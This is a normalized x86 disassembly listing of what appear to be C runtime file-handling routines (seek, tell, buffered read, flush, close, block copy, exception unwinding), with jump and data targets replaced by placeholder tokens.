or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_10031f47
pop ecx
push eax
call sub_10033d3d
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_10031f47
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_10031f47
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_10031f47
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10031f47
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_100328fc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10039ff1
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_1002d501
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_10032971
push 0x10
push r--data
call sub_1002fdfc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1002d4ee
and [ eax ] 0x0
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] edi
call sub_1002d4db
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1002fe41
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1003a068
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100328fc
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10032a43
mov eax [ ebp - 0x1c ]
sub_10032a4d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_10031f47
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
push 0x1
push ebx
push eax
call sub_10032971
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_10032971
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_10032971
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_10032bea
mov edi edi
push ebp
mov ebp esp
mov eax 0x1020
call sub_1002e680
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10031f47
mov ebx eax
xor eax eax
cmp [ esi + 0x4 ] eax
pop ecx
mov [ ebp - 0x1018 ] ebx
jge r-xdata
push 0x1
push eax
push eax
push ebx
call sub_10038a57
add esp 0x10
mov edi eax
mov [ ebp - 0x1014 ] edi
mov [ ebp - 0x1010 ] edx
test edx edx
jg r-xdata
mov [ esi + 0x4 ] eax
mov eax ebx
sar eax 0x5
lea eax [ eax * 4 + rw-data ]
and ebx 0x1f
mov [ ebp - 0x101c ] eax
mov eax [ eax ]
shl ebx 0x6
add eax ebx
mov cl [ eax + 0x24 ]
add cl cl
sar cl 0x1
test [ esi + 0xc ] 0x108
mov [ ebp - 0x1005 ] cl
jne r-xdata
jl r-xdata
mov ecx [ esi ]
mov edx [ esi + 0x8 ]
mov edi ecx
sub edi edx
mov edx [ esi + 0xc ]
mov [ ebp - 0x100c ] edi
test dl 0x3
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x1010 ]
cdq
sub edi eax
sbb ecx edx
mov eax edi
mov edx ecx
jmp r-xdata
or eax 0xffffffff
or edx eax
jmp r-xdata
test edi edi
jae r-xdata
test dl dl
js r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
mov edx [ ebp - 0x1014 ]
or edx [ ebp - 0x1010 ]
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x16
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
xor edx edx
cmp [ eax + 0x30 ] edx
je r-xdata
test [ esi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x100c ]
jmp r-xdata
mov edx [ esi + 0x8 ]
jmp r-xdata
shr edi 0x1
mov [ ebp - 0x1020 ] edi
cmp [ esi + 0x4 ] edx
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
cmp edx ecx
jb r-xdata
push edx
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ ebp - 0x1018 ]
call sub_10038a57
mov esi eax
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
add eax ebx
add esp 0x10
mov edi edx
cmp esi [ eax + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x1014 ]
mov edx [ ebp - 0x1010 ]
jmp r-xdata
mov eax [ ebp - 0x100c ]
xor edx edx
add eax [ ebp - 0x1014 ]
adc edx [ ebp - 0x1010 ]
shr [ ebp - 0x100c ] 0x1
sub ecx [ esi + 0x8 ]
add ecx edx
test [ eax + 0x4 ] 0x80
mov edi ecx
je r-xdata
and [ ebp - 0x100c ] edx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
cmp edi [ eax + 0x2c ]
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp - 0x1018 ]
call sub_10038a57
add esp 0x10
cmp eax [ ebp - 0x1014 ]
jne r-xdata
inc edx
inc [ ebp - 0x100c ]
push 0x0
lea ecx [ ebp - 0x100c ]
push ecx
push 0x1000
lea ecx [ ebp - 0x1004 ]
push ecx
push [ eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub [ ebp - 0x1014 ] edi
sbb [ ebp - 0x1010 ] 0x0
shr edi 0x1
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_10038a57
add esp 0x10
test edx edx
jg r-xdata
cmp edx [ ebp - 0x1010 ]
jne r-xdata
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_10038a57
add esp 0x10
test edx edx
jg r-xdata
mov eax 0x200
cmp edi eax
ja r-xdata
jl r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ eax + edi ]
jmp r-xdata
mov ecx [ ebp - 0x100c ]
mov ebx [ ebp - 0x1020 ]
cmp ebx ecx
ja r-xdata
jl r-xdata
mov edi [ esi + 0x18 ]
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
test eax eax
jb r-xdata
cmp eax ecx
jb r-xdata
lea eax [ ebp - 0x1004 ]
test ebx ebx
je r-xdata
test eax eax
jb r-xdata
inc edi
mov edi eax
test ecx 0x400
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ esi + 0xc ] 0x2000
jmp r-xdata
lea ecx [ ebp - 0x1004 ]
sub eax ecx
xor edx edx
add eax esi
adc edx edi
jmp r-xdata
lea edx [ ebp + ecx - 0x1004 ]
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
test [ eax + ebx + 0x4 ] 0x4
inc eax
inc edi
je r-xdata
mov cl [ eax ]
cmp cl 0xd
jne r-xdata
movzx ecx cl
movsx ecx [ ecx + rw-data ]
add eax ecx
lea ecx [ edx - 0x1 ]
cmp eax ecx
jae r-xdata
dec ebx
cmp eax edx
jae r-xdata
inc eax
test ebx ebx
jne r-xdata
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax ecx
jmp r-xdata
sub_10032f36
push 0x10
push r--data
call sub_1002fdfc
push [ ebp + 0x8 ]
call sub_1002a645
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10032bea
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10032f76
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_1002fe41
retn
sub_10032f80
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
push edi
test al 0x83
je r-xdata
call sub_1002d4db
mov [ eax ] 0x16
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
and eax 0xffffffef
mov [ esi + 0xc ] eax
cmp edi 0x1
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_10029ddd
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_10032bea
add [ ebp + 0xc ] eax
pop ecx
adc [ ebp + 0x10 ] edx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10031f47
pop ecx
push eax
call sub_10038a57
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test al 0x8
je r-xdata
or eax 0xffffffff
xor eax eax
jmp r-xdata
test eax 0x400
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_1003301c
push 0xc
push r--data
call sub_1002fdfc
push [ ebp + 0x8 ]
call sub_1002a645
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10032f80
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10033061
mov eax [ ebp - 0x1c ]
call sub_1002fe41
retn
sub_1003306b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10027a85
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1003309c
push 0x10
push r--data
call sub_1002fdfc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4db
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10027801
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1002fe41
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1003a068
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1002d4db
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_10039ff1
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10033173
mov eax [ ebp - 0x1c ]
call sub_1002d4ee
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_1003317d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10039ff1
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_1002d501
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10039ff1
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10039ff1
push 0x1
mov edi eax
call sub_10039ff1
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_10039f6b
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_10033219
push 0x10
push r--data
call sub_1002fdfc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1002d4ee
and [ eax ] 0x0
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] edi
call sub_1002d4db
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1002fe41
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1003a068
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1002d4db
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_1003317d
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100332dc
mov eax [ ebp - 0x1c ]
sub_100332e6
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1003336d
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_1003336d
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_100332e6
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_10033450
push 0x10
push r--data
call sub_1002fdfc
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100334e6
mov eax [ ebp - 0x1c ]
call sub_1002fe41
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_1002a03a
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_10027a85
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_100334ef
push 0x10
push r--data
call sub_1002fdfc
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003361e
mov eax edi
call sub_1002fe41
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_1002ddb0
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_10034ae2
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_10027a85
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1002a686
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_1003013b
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_1002a6f4
pop ecx
pop ecx
sub_10033628
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_100336b8
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_1003a3e1
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_1003a400
jmp r-xdata
sub_100336b8
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10027150
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10033628
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1003371a
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1003374a
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1003377b
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_1002d4ee
and [ eax ] 0x0
call sub_1002d4db
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_1002d4ee
mov [ eax ] ebx
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_1002d4ee
mov [ eax ] ebx
call sub_1002d4db
mov [ eax ] 0x9
jmp r-xdata
call sub_1002d4ee
mov [ eax ] ebx
call sub_1002d4db
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10027801
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_1002ddb0
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_100389d2
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_1002d4db
mov [ eax ] 0xc
call sub_1002d4ee
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_1002d4db
